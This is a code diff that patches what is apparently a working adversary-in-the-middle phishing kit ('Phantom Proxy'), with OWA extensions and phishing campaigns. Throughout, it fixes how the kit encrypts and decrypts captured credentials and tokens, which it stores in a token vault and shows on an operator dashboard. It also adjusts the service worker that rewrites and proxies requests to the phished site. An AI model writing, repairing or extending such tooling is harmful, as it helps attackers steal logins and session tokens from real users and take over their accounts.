@@ -1,3 +1,10 @@
+// ============================================================
+// 🥔 PHANTOM PROXY v11.35 — FULL ULTIMATE EDITION (FIXED)
+// Includes: AiTM Proxy, Dashboard, AI, Automation, Integrations,
+// OPSEC, Visuals, Collaboration, PWA, Plugins, Advanced Replay,
+// OWA Extensions, Campaigns, System Stats, Crypto, Testing, Self-Learning.
+// ============================================================
+
 const http = require("http");
 const https = require("https");
 const path = require("path");
@@ -563,8 +570,10 @@ function displayError(message, error, ...args) {
 
 async function encryptData(data) {
     const iv = crypto.randomBytes(16);
+    // 🔥 FIXED: convert key to Buffer
+    const keyBuf = Buffer.from(ENCRYPTION_KEY, 'hex');
     return new Promise((resolve, reject) => {
-        const cipher = crypto.createCipheriv("aes-256-ctr", ENCRYPTION_KEY, iv);
+        const cipher = crypto.createCipheriv("aes-256-ctr", keyBuf, iv);
         const encryptedData = [];
         cipher.on("error", reject)
               .on("data", chunk => encryptedData.push(chunk))
@@ -1153,7 +1162,8 @@ const swFileName = PROXY_PATHNAMES.serviceWorker.replace('/', '');
 const swFilePath = path.join(__dirname, swFileName);
 if (!fs.existsSync(notFoundFile)) fs.writeFileSync(notFoundFile, '<h1>404 Not Found</h1>');
 if (!fs.existsSync(scriptFile)) fs.writeFileSync(scriptFile, 'console.log("Service worker loaded");');
-// Service worker code with rewriteUrl embedded
+
+// 🔥 FIXED SERVICE WORKER CODE
 const serviceWorkerCode = `
 const PROXY_PATH = '${PROXY_PATHNAMES.proxy}';
 const DEST_PARAM = '${PHISHED_URL_PARAMETER}';
@@ -1190,14 +1200,14 @@ self.addEventListener('activate', (event) => event.waitUntil(self.clients.claim(
 
 self.addEventListener('fetch', (event) => {
     const url = new URL(event.request.url);
-    // Skip our own proxy endpoint and internal paths
+    // Skip internal paths
     if (url.pathname === PROXY_PATH ||
         url.pathname === '${PROXY_PATHNAMES.serviceWorker}' ||
         url.pathname === '${PROXY_PATHNAMES.script}') {
         return;
     }
 
-    // Rewrite the request URL if needed
+    // Rewrite if needed
     const rewritten = rewriteUrl(event.request.url);
     if (rewritten !== event.request.url) {
         console.log('[SW] Rewriting request:', event.request.url, '->', rewritten);
@@ -1205,7 +1215,13 @@ self.addEventListener('fetch', (event) => {
         return;
     }
 
-    // Otherwise, try to forward via the proxy (if needed) or just fetch normally
+    // 🔥 SAFETY CHECK: if PROXY_PATH is empty, fallback to normal fetch
+    if (!PROXY_PATH) {
+        event.respondWith(fetch(event.request));
+        return;
+    }
+
+    // Otherwise forward via proxy
     event.respondWith(
         (async () => {
             try {
@@ -1239,7 +1255,8 @@ if (!fs.existsSync(swFilePath)) fs.writeFileSync(swFilePath, serviceWorkerCode);
 class TokenVault {
     constructor(logsDir, encryptionKey) {
         this.logsDir = logsDir;
-        this.encryptionKey = encryptionKey;
+        // 🔥 FIXED: store as Buffer
+        this.encryptionKey = Buffer.from(encryptionKey, 'hex');
         this.tokens = [];
         this.scanLogs();
     }
@@ -1265,6 +1282,7 @@ class TokenVault {
                         const entry = JSON.parse(line);
                         const iv = Object.keys(entry)[0];
                         const encrypted = entry[iv];
+                        // 🔥 FIXED: use Buffer key
                         const decipher = crypto.createDecipheriv('aes-256-ctr', this.encryptionKey, Buffer.from(iv, 'hex'));
                         let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                         decrypted = Buffer.concat([decrypted, decipher.final()]);
@@ -1463,7 +1481,7 @@ async function hasCapturedCredentials(logFilename) {
                 const entry = JSON.parse(line);
                 const iv = Object.keys(entry)[0];
                 const encrypted = entry[iv];
-                const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
+                const decipher = crypto.createDecipheriv('aes-256-ctr', Buffer.from(ENCRYPTION_KEY, 'hex'), Buffer.from(iv, 'hex'));
                 let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                 decrypted = Buffer.concat([decrypted, decipher.final()]);
                 const obj = JSON.parse(decrypted.toString('utf-8'));
@@ -1666,7 +1684,7 @@ async function handleDashboardAPI(req, res) {
                     const entry = JSON.parse(line);
                     const iv = Object.keys(entry)[0];
                     const encrypted = entry[iv];
-                    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
+                    const decipher = crypto.createDecipheriv('aes-256-ctr', Buffer.from(ENCRYPTION_KEY, 'hex'), Buffer.from(iv, 'hex'));
                     let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                     decrypted = Buffer.concat([decrypted, decipher.final()]);
                     return JSON.parse(decrypted.toString('utf-8'));
@@ -2238,7 +2256,7 @@ async function handleDashboardAPI(req, res) {
                             const entry = JSON.parse(line);
                             const iv = Object.keys(entry)[0];
                             const encrypted = entry[iv];
-                            const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
+                            const decipher = crypto.createDecipheriv('aes-256-ctr', Buffer.from(ENCRYPTION_KEY, 'hex'), Buffer.from(iv, 'hex'));
                             let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                             decrypted = Buffer.concat([decrypted, decipher.final()]);
                             const obj = JSON.parse(decrypted.toString('utf-8'));
@@ -2405,7 +2423,7 @@ async function handleDashboardAPI(req, res) {
                     const entry = JSON.parse(line);
                     const iv = Object.keys(entry)[0];
                     const encrypted = entry[iv];
-                    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
+                    const decipher = crypto.createDecipheriv('aes-256-ctr', Buffer.from(ENCRYPTION_KEY, 'hex'), Buffer.from(iv, 'hex'));
                     let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                     decrypted = Buffer.concat([decrypted, decipher.final()]);
                     const obj = JSON.parse(decrypted.toString('utf-8'));
@@ -2523,7 +2541,7 @@ async function handleDashboardAPI(req, res) {
                     const entry = JSON.parse(line);
                     const iv = Object.keys(entry)[0];
                     const encrypted = entry[iv];
-                    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
+                    const decipher = crypto.createDecipheriv('aes-256-ctr', Buffer.from(ENCRYPTION_KEY, 'hex'), Buffer.from(iv, 'hex'));
                     let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                     decrypted = Buffer.concat([decrypted, decipher.final()]);
                     const obj = JSON.parse(decrypted.toString('utf-8'));
